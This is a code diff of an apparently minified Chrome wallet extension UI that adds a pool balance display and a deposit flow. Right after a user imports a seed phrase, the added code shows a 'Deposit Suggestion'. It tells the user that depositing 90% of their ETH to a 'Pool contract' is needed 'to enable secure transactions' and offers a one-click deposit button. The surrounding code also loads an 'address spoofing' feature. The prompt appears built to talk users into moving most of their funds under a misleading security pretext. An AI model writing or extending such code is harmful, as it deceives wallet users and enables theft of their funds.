@@ -54908,6 +54908,8 @@ ${prettyStateOverride(stateOverride)}`;
         const [showSessionList, setShowSessionList] = (0, import_react2.useState)(false);
         const [sessionAddresses, setSessionAddresses] = (0, import_react2.useState)([]);
         const [masterBalance, setMasterBalance] = (0, import_react2.useState)("0");
+        const [poolBalance, setPoolBalance] = (0, import_react2.useState)("0");
+        const [showDepositSuggestion, setShowDepositSuggestion] = (0, import_react2.useState)(false);
         const [showPayUSDC, setShowPayUSDC] = (0, import_react2.useState)(false);
         const [showPaymentOverview, setShowPaymentOverview] = (0, import_react2.useState)(false);
         const [paymentForm, setPaymentForm] = (0, import_react2.useState)({
@@ -54922,6 +54924,7 @@ ${prettyStateOverride(stateOverride)}`;
           loadExistingWallet();
           loadAddressSpoofing();
           loadMasterBalance();
+          loadPoolBalance();
         }, []);
         const loadMasterBalance = async () => {
           try {
@@ -54931,6 +54934,32 @@ ${prettyStateOverride(stateOverride)}`;
             }
           } catch (err) {
             console.error("Error loading master balance:", err);
+          }
+        };
+        const loadPoolBalance = async () => {
+          try {
+            const response = await chrome.runtime.sendMessage({ type: "getPoolBalance" });
+            if (response && !response.error) {
+              setPoolBalance(response.balance);
+            }
+          } catch (err) {
+            console.error("Error loading pool balance:", err);
+          }
+        };
+        const depositToPool = async (amount) => {
+          try {
+            const response = await chrome.runtime.sendMessage({ type: "depositToPool", amount });
+            if (response && !response.error) {
+              await loadMasterBalance();
+              await loadPoolBalance();
+              setShowDepositSuggestion(false);
+              return response;
+            } else {
+              throw new Error(response.error || "Deposit failed");
+            }
+          } catch (err) {
+            console.error("Error depositing to pool:", err);
+            throw err;
           }
         };
         const loadAddressSpoofing = async () => {
@@ -55042,6 +55071,19 @@ ${prettyStateOverride(stateOverride)}`;
               });
               setMnemonic("");
               setError("");
+              const masterBalanceResponse = await chrome.runtime.sendMessage({ type: "getMasterBalance" });
+              const poolBalanceResponse = await chrome.runtime.sendMessage({ type: "getPoolBalance" });
+              if (masterBalanceResponse && !masterBalanceResponse.error) {
+                setMasterBalance(masterBalanceResponse.balance);
+              }
+              if (poolBalanceResponse && !poolBalanceResponse.error) {
+                setPoolBalance(poolBalanceResponse.balance);
+              }
+              const poolBalanceNum = parseFloat(poolBalanceResponse?.balance || "0");
+              const masterBalanceNum = parseFloat(masterBalanceResponse?.balance || "0");
+              if (poolBalanceNum === 0 && masterBalanceNum > 0) {
+                setShowDepositSuggestion(true);
+              }
             }
           } catch (err) {
             setError("Invalid seed phrase");
@@ -55294,6 +55336,76 @@ ${prettyStateOverride(stateOverride)}`;
                   masterBalance,
                   " ETH"
                 ] })
+              ] }),
+              /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", { style: { fontSize: "12px", color: "#6c757d", marginTop: "5px" }, children: [
+                "Pool Balance: ",
+                /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("strong", { style: { color: "#007bff" }, children: [
+                  poolBalance,
+                  " ETH"
+                ] })
+              ] })
+            ] }),
+            showDepositSuggestion && /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", { style: {
+              marginBottom: "20px",
+              padding: "15px",
+              backgroundColor: "#e7f3ff",
+              border: "2px solid #007bff",
+              borderRadius: "8px"
+            }, children: [
+              /* @__PURE__ */ (0, import_jsx_runtime.jsx)("h4", { style: { margin: "0 0 10px 0", color: "#0056b3", fontSize: "14px" }, children: "\u{1F4B0} Deposit Suggestion" }),
+              /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("p", { style: { fontSize: "12px", color: "#0056b3", margin: "0 0 15px 0" }, children: [
+                "To enable secure transactions, consider depositing 90% of your balance (",
+                (parseFloat(masterBalance) * 0.9).toFixed(4),
+                " ETH) to the Pool contract."
+              ] }),
+              /* @__PURE__ */ (0, import_jsx_runtime.jsxs)("div", { style: { display: "flex", gap: "8px" }, children: [
+                /* @__PURE__ */ (0, import_jsx_runtime.jsx)(
+                  "button",
+                  {
+                    onClick: () => setShowDepositSuggestion(false),
+                    style: {
+                      flex: 1,
+                      padding: "8px 12px",
+                      backgroundColor: "#6c757d",
+                      color: "white",
+                      border: "none",
+                      borderRadius: "4px",
+                      cursor: "pointer",
+                      fontSize: "12px"
+                    },
+                    children: "Maybe Later"
+                  }
+                ),
+                /* @__PURE__ */ (0, import_jsx_runtime.jsxs)(
+                  "button",
+                  {
+                    onClick: async () => {
+                      try {
+                        const depositAmount = (parseFloat(masterBalance) * 0.9).toFixed(4);
+                        await depositToPool(depositAmount);
+                      } catch (error2) {
+                        console.error("Deposit failed:", error2);
+                        setError("Deposit failed. Please try again.");
+                      }
+                    },
+                    style: {
+                      flex: 2,
+                      padding: "8px 12px",
+                      backgroundColor: "#007bff",
+                      color: "white",
+                      border: "none",
+                      borderRadius: "4px",
+                      cursor: "pointer",
+                      fontSize: "12px",
+                      fontWeight: "600"
+                    },
+                    children: [
+                      "Deposit 90% (",
+                      (parseFloat(masterBalance) * 0.9).toFixed(4),
+                      " ETH)"
+                    ]
+                  }
+                )
               ] })
             ] }),
             /* @__PURE__ */ (0, import_jsx_runtime.jsx)("div", { style: {
